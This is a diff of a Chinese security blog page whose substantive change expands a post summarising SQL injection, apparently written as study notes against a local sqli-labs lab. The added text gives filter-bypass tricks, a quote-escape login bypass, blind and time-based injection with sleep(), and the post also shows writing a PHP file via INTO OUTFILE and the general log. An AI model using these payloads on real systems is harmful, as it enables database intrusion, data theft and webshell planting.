@@ -6,17 +6,20 @@
   <meta name="keywords" content=" SQL注入 ">
   <meta name="description" content="SQL注入总结 | prontosil&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="关于我">
-<meta property="og:type" content="website">
-<meta property="og:title" content="about">
-<meta property="og:url" content="http://prontosil.com/about/index.html">
+<meta name="description" content="msf常用命令msfvenom参数：  -l 列出相关的值，这些值包括 payloads, encoders, nops, platforms, archs, encrypt, formats, all  -b badchar 参数被设置的时候，它的值中描述的字符将会被避免出现在 Payload 中  -e 开启payload编码   msfvenom -l encoders 列出所有的编码器其中">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透常见知识">
+<meta property="og:url" content="http://prontosil.com/posts/6941c9ee/index.html">
 <meta property="og:site_name" content="prontosil&#39;s Blog">
-<meta property="og:description" content="关于我">
+<meta property="og:description" content="msf常用命令msfvenom参数：  -l 列出相关的值，这些值包括 payloads, encoders, nops, platforms, archs, encrypt, formats, all  -b badchar 参数被设置的时候，它的值中描述的字符将会被避免出现在 Payload 中  -e 开启payload编码   msfvenom -l encoders 列出所有的编码器其中">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-01-30T01:19:01.000Z">
-<meta property="article:modified_time" content="2020-03-01T04:03:15.091Z">
+<meta property="og:image" content="http://prontosil.com/posts/6941c9ee/1584495111390.png">
+<meta property="article:published_time" content="2020-03-18T01:09:58.000Z">
+<meta property="article:modified_time" content="2020-03-18T01:52:24.797Z">
 <meta property="article:author" content="prontosil">
+<meta property="article:tag" content="内网">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://prontosil.com/posts/6941c9ee/1584495111390.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -144,7 +147,7 @@
 
 
 <ul>
-    <li><div class="all active">全部文章<small>(61)</small></div></li>
+    <li><div class="all active">全部文章<small>(62)</small></div></li>
     
         
             
@@ -164,14 +167,6 @@
     
         
             
-            <li><div data-rel="编程">编程<small>(16)</small></div>
-                
-            </li>
-            
-        
-    
-        
-            
             <li><div data-rel="代码审计">代码审计<small>(2)</small></div>
                 
             </li>
@@ -180,7 +175,23 @@
     
         
             
+            <li><div data-rel="编程">编程<small>(16)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
             <li><div data-rel="生活">生活<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="渗透">渗透<small>(1)</small></div>
                 
             </li>
             
@@ -196,8 +207,8 @@
     </div>
     <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="61">
-<input type="hidden" id="yelog_site_word_count" value="42.2k">
+<input type="hidden" id="yelog_site_posts_number" value="62">
+<input type="hidden" id="yelog_site_word_count" value="44.2k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -241,14 +252,6 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color1">JavaScript</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color1">原型链污染</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color4">POP</a>
     </li>
     
@@ -257,7 +260,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color1">Linux</a>
+        <a class="color1">JavaScript</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">原型链污染</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -281,6 +288,14 @@
     </li>
     
     <li class="article-tag-list-item">
+        <a class="color4">php</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">函数</a>
+    </li>
+    
+    <li class="article-tag-list-item">
         <a class="color5">java</a>
     </li>
     
@@ -293,15 +308,7 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">php</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">函数</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color2">pickle</a>
+        <a class="color2">python</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -313,7 +320,7 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color2">python</a>
+        <a class="color2">pickle</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -325,10 +332,6 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">thinkphp</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color5">文件上传</a>
     </li>
     
@@ -337,11 +340,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color3">实验</a>
+        <a class="color4">cms</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">cms</a>
+        <a class="color3">实验</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -349,19 +352,7 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">CTF</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color5">命令执行</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">域名</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">隐写</a>
+        <a class="color3">内网</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -369,11 +360,23 @@
     </li>
     
     <li class="article-tag-list-item">
+        <a class="color3">隐写</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">Linux</a>
+    </li>
+    
+    <li class="article-tag-list-item">
         <a class="color3">比赛</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">dig</a>
+        <a class="color5">kill</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">命令执行</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -385,7 +388,15 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">kill</a>
+        <a class="color4">thinkphp</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">leetcode</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">dig</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -397,7 +408,7 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">leetcode</a>
+        <a class="color4">CTF</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -440,6 +451,10 @@
         <a class="color4">ctf</a>
     </li>
     
+    <li class="article-tag-list-item">
+        <a class="color3">域名</a>
+    </li>
+    
     <div class="clearfix"></div>
 </div>
 
@@ -456,6 +471,14 @@
            data-author="" >
             <span class="post-title" title="常用的网站">常用的网站</span>
             <span class="post-date" title="2020-03-10 13:30:08">2020/03/10</span>
+        </a>
+        
+        <a  class="渗透 "
+           href="/posts/6941c9ee/"
+           data-tag="内网"
+           data-author="" >
+            <span class="post-title" title="内网渗透常见知识">内网渗透常见知识</span>
+            <span class="post-date" title="2020-03-18 09:09:58">2020/03/18</span>
         </a>
         
         <a  class="CTF "
@@ -974,12 +997,12 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-03-18 08:28:59'>2020-03-17 22:35</time>
+        创建时间:<time class="date" title='更新时间: 2020-03-18 15:57:35'>2020-03-17 22:35</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:292</span>
+        <span>字数:778</span>
         
         
         
@@ -987,7 +1010,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#常用的绕过手段"><span class="toc-text">常用的绕过手段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#字符型过滤单引号"><span class="toc-text">字符型过滤单引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤"><span class="toc-text">过滤&#x3D;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注释符"><span class="toc-text">注释符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用方式"><span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#写shell"><span class="toc-text">写shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#联合查询写shell"><span class="toc-text">联合查询写shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#非联合查询写shell"><span class="toc-text">非联合查询写shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用日志写shell"><span class="toc-text">使用日志写shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#延时注入写shell"><span class="toc-text">延时注入写shell</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#常用的绕过手段"><span class="toc-text">常用的绕过手段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#字符型过滤单引号"><span class="toc-text">字符型过滤单引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤"><span class="toc-text">过滤&#x3D;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注释符"><span class="toc-text">注释符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤逗号"><span class="toc-text">过滤逗号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lt-，-gt-被过滤"><span class="toc-text">&lt;，&gt;被过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤and，or可以使用-amp-amp-和"><span class="toc-text">过滤and，or可以使用&amp;&amp;和||</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#单引号逃逸"><span class="toc-text">单引号逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注释符-1"><span class="toc-text">注释符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤select"><span class="toc-text">过滤select</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#延时注入"><span class="toc-text">延时注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL利用方式"><span class="toc-text">MySQL利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#写shell"><span class="toc-text">写shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#联合查询写shell"><span class="toc-text">联合查询写shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#非联合查询写shell"><span class="toc-text">非联合查询写shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用日志写shell"><span class="toc-text">使用日志写shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#延时注入写shell"><span class="toc-text">延时注入写shell</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1018,7 +1041,67 @@ select 1, table_name from information_schema.tables where table_name like &#39;u
 -- 后面要加空格
 /**/ 只加前半个也行
 ;%00 Nullbyte
-` Backtick</code></pre><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><h4 id="联合查询写shell"><a href="#联合查询写shell" class="headerlink" title="联合查询写shell"></a>联合查询写shell</h4><pre><code>UNION+ALL+SELECT+1,2,’&lt;? phpinfo(); ?&gt;’ into outfile ‘G:/2.txt’ %23</code></pre><h4 id="非联合查询写shell"><a href="#非联合查询写shell" class="headerlink" title="非联合查询写shell"></a>非联合查询写shell</h4><pre><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1 into outfile ‘G:/2.txt’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’%23</code></pre><h4 id="使用日志写shell"><a href="#使用日志写shell" class="headerlink" title="使用日志写shell"></a>使用日志写shell</h4><pre><code class="p">set global general_log = on;
+` Backtick</code></pre><h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号</p>
+<pre><code>select substr(database() from 1 for 1);
+select mid(database() from 1 for 1);</code></pre><p>使用join(连接表的查询结果)</p>
+<pre><code class="sql">union select 1,2     #等价于
+union select * from (select 1)a join (select 2)b
+
+mysql&gt; SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e);
++---+---+---+---+---+
+| 1 | 2 | 3 | 4 | 5 |
++---+---+---+---+---+
+| 1 | 2 | 3 | 4 | 5 |
++---+---+---+---+---+
+1 row in set (0.00 sec)</code></pre>
+<p>使用like</p>
+<pre><code class="sql">select ascii(mid(user(),1,1))=80   #等价于
+select user() like &#39;r%&#39;
+
+mysql&gt; select user() like &#39;r%&#39;;
++------------------+
+| user() like &#39;r%&#39; |
++------------------+
+|                1 |
++------------------+
+1 row in set (0.00 sec)</code></pre>
+<p>对于 <code>limit</code> 可以使用 offset绕过</p>
+<pre><code class="sql">select * from news limit 0,1
+# 等价于下面这条SQL语句
+select * from news limit 1 offset 0</code></pre>
+<h3 id="lt-，-gt-被过滤"><a href="#lt-，-gt-被过滤" class="headerlink" title="&lt;，&gt;被过滤"></a>&lt;，&gt;被过滤</h3><ul>
+<li>greatest函数绕过</li>
+</ul>
+<blockquote>
+<p>greatest(a,b)，返回a和b中较大的那个数</p>
+</blockquote>
+<pre><code># 猜解user()第一个字符的ascii码是否小于等于150时
+ascii(mid(user(),1,1)) &lt;= 150
+=greatest(ascii(mid(user(),1,1)), 150)=150;</code></pre><h3 id="过滤and，or可以使用-amp-amp-和"><a href="#过滤and，or可以使用-amp-amp-和" class="headerlink" title="过滤and，or可以使用&amp;&amp;和||"></a>过滤and，or可以使用&amp;&amp;和||</h3><h3 id="单引号逃逸"><a href="#单引号逃逸" class="headerlink" title="单引号逃逸"></a>单引号逃逸</h3><ul>
+<li>\</li>
+</ul>
+<pre><code># 用户名为username
+SQL&gt; select * from db where name=&#39;username\&#39; and passwd=&#39; or 1=1#</code></pre><h3 id="注释符-1"><a href="#注释符-1" class="headerlink" title="注释符"></a>注释符</h3><pre><code># %23
+-- 后面要加空格
+/**/ 只加前半个也行
+;%00 Nullbyte
+` Backtick</code></pre><h3 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h3><p>利用数值计算盲注或时间盲注</p>
+<pre><code>|| ascii(mid(user(),1,1) ) = 97 %23</code></pre><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>数据库如下</p>
+<pre><code>mysql&gt; select * from user;
++----+----------+----------------------------------+
+| id | username | password                         |
++----+----------+----------------------------------+
+|  1 | zz       | 25ed1bcb423b0b7200f485fc5ff71c8e |
++----+----------+----------------------------------+
+1 row in set (0.00 sec)</code></pre><p>测试</p>
+<pre><code>mysql&gt; select password from user where id=1 and  (select hex(substr(database(), 1,1)) &gt; 20) and sleep(2);
+Empty set (2.00 sec)
+
+mysql&gt; select password from user where id=1 and  (select hex(substr(database(), 1,1)) &gt; 89) and sleep(2);
+Empty set (0.00 sec)</code></pre><p>我们这么来理解多语句的and</p>
+<p>数据库会每次取出一行数据，然后做判断，首先 <code>id=1</code> 成立，然后 判断<code>(select hex(substr(database(), 1,1)) &gt; 20)</code> </p>
+<p>如果这个成立，就会执行接下来的 <code>sleep(2)</code> 如果不成立，那么直接over了。不会有延时</p>
+<h2 id="MySQL利用方式"><a href="#MySQL利用方式" class="headerlink" title="MySQL利用方式"></a>MySQL利用方式</h2><h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><h4 id="联合查询写shell"><a href="#联合查询写shell" class="headerlink" title="联合查询写shell"></a>联合查询写shell</h4><pre><code>UNION+ALL+SELECT+1,2,’&lt;? phpinfo(); ?&gt;’ into outfile ‘G:/2.txt’ %23</code></pre><h4 id="非联合查询写shell"><a href="#非联合查询写shell" class="headerlink" title="非联合查询写shell"></a>非联合查询写shell</h4><pre><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1 into outfile ‘G:/2.txt’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’%23</code></pre><h4 id="使用日志写shell"><a href="#使用日志写shell" class="headerlink" title="使用日志写shell"></a>使用日志写shell</h4><pre><code class="p">set global general_log = on;
 开启日志监测，一般是关闭的，如果一直开，文件会很大的。
 
 set global general_log_file = ‘G:/2.txt’;
@@ -1042,10 +1125,10 @@ set global general_log = off;
 
 <div class="article_copyright">
     <p><span class="copy-title">文章标题:</span>SQL注入总结</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">292</span></p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">778</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="prontosil">prontosil</a></p>
     <p><span class="copy-title">发布时间:</span>2020-03-17, 22:35:41</p>
-    <p><span class="copy-title">最后更新:</span>2020-03-18, 08:28:59</p>
+    <p><span class="copy-title">最后更新:</span>2020-03-18, 15:57:35</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/9b13a55/" title="SQL注入总结">http://prontosil.com/posts/9b13a55/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
@@ -1141,7 +1224,7 @@ set global general_log = off;
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#HTB','#靶机','#JavaScript','#原型链污染','#POP','#SQL注入','#Linux','#XSS','#xxe','#xml','#apache','#docker','#java','#反序列化','#jndi','#php','#函数','#pickle','#字符串','#bytes','#python','#文档','#SQL','#thinkphp','#文件上传','#vulnhub','#实验','#cms','#游戏','#CTF','#命令执行','#域名','#隐写','#网站','#比赛','#dig','#AWD','#总结','#kill','#xxd','#hexdump','#leetcode','#tcpdump','#提权','#汇编','#dosbox','#Apache','#RCE','#SSI','#截断','#CSP','#ctf',],
+            'data': ['#HTB','#靶机','#POP','#SQL注入','#JavaScript','#原型链污染','#XSS','#xxe','#xml','#apache','#docker','#php','#函数','#java','#反序列化','#jndi','#python','#字符串','#bytes','#pickle','#文档','#SQL','#文件上传','#vulnhub','#cms','#实验','#游戏','#内网','#网站','#隐写','#Linux','#比赛','#kill','#命令执行','#AWD','#总结','#thinkphp','#leetcode','#dig','#xxd','#hexdump','#CTF','#tcpdump','#提权','#汇编','#dosbox','#Apache','#RCE','#SSI','#截断','#CSP','#ctf','#域名',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
